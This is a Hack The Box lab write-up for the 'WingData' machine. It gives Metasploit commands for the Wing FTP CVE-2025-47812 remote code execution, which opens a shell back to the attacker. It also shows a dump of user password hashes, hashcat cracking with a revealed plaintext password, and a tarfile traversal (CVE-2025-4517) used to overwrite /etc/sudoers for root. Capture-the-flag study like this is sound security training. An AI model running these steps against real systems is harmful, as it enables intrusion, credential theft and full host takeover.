WingData — HTB Write-up

1. Reconnaissance

Port Scan

Initial scan revealed only two exposed services.

sudo nmap -sC -sV -p- 10.129.x.x

Result:
	•	22/tcp — SSH
	•	80/tcp — HTTP

⸻

2. Web Enumeration

Virtual Host Discovery

The site did not show much content, so virtual hosts were fuzzed.

ffuf -u http://wingdata.htb \
-H "Host: FUZZ.wingdata.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Discovered:

ftp.wingdata.htb


⸻

3. Wing FTP Server Exploitation

Visiting the new vhost revealed a Wing FTP login panel.

Version identified → Wing FTP Server 7.4.3

This version is vulnerable to:

CVE-2025-47812 — NULL byte Lua session injection → Unauthenticated RCE

⸻

Metasploit Exploit

msfconsole
use exploit/multi/http/wingftp_null_byte_rce
set RHOSTS ftp.wingdata.htb
set RPORT 80
set LHOST tun0
run

Shell obtained:

uid=1000(wingftp)


⸻

Stabilize Shell

python3 -c 'import pty; pty.spawn("/bin/bash")'


⸻

4. Credential Extraction

WingFTP stores users in XML files.

/opt/wftpserver/Data/1/users/

Dump credentials:

cat /opt/wftpserver/Data/1/users/*.xml

Extracted:

john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca


⸻

5. Understanding the Hash Format

Rockyou cracking failed:

hashcat -m 1400 hashes.txt rockyou.txt

So the application code was inspected:

grep "salt_string" /opt/wftpserver/lua/ServerInterface.lua

Found:

temppass = user.password..salt_string
password_md5 = sha2(temppass)

Salt location:

cat /opt/wftpserver/Data/1/settings.xml

<SaltingString>WingFTP</SaltingString>

Hash format:

SHA256(password + "WingFTP")


⸻

6. Cracking Passwords

Prepare salted hashes:

cat > salted_hashes.txt << EOF
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
EOF

Correct hashcat mode:

1410 = sha256($pass.$salt)

hashcat -m 1410 salted_hashes.txt /usr/share/wordlists/rockyou.txt

Cracked:

wacky : !#7Blushing^*Bride5


⸻

7. SSH Access

ssh wacky@10.129.x.x

Retrieve user flag:

cat ~/user.txt


⸻

8. Privilege Escalation

Sudo Permissions

sudo -l

Output:

(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *


⸻

9. Vulnerability — Python tarfile Extraction (CVE-2025-4517)

The script extracts tar archives:

tar.extractall(path=staging_dir, filter="data")

This is vulnerable to symlink + hardlink traversal → Arbitrary file write as root.

Goal:
Write to:

/etc/sudoers


⸻

10. Exploit

Generate malicious archive (on target):

python3 exploit4517.py
mv /tmp/backup_9999.tar /opt/backup_clients/backups/

Execute restore:

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
-b backup_9999.tar \
-r restore_pwn


⸻

11. Root Access

Verify:

sudo -l

Then:

sudo /bin/bash

Root obtained.

⸻

12. Flags

cat /root/root.txt


⸻

Attack Chain Summary
	1.	Port scan → found HTTP + SSH
	2.	Vhost fuzzing → ftp.wingdata.htb
	3.	WingFTP 7.4.3 RCE → foothold
	4.	Extract user hashes
	5.	Reverse-engineer salted SHA256 format
	6.	Crack credentials → wacky
	7.	SSH login → user flag
	8.	Abuse backup restore script (tarfile CVE)
	9.	Overwrite sudoers → root

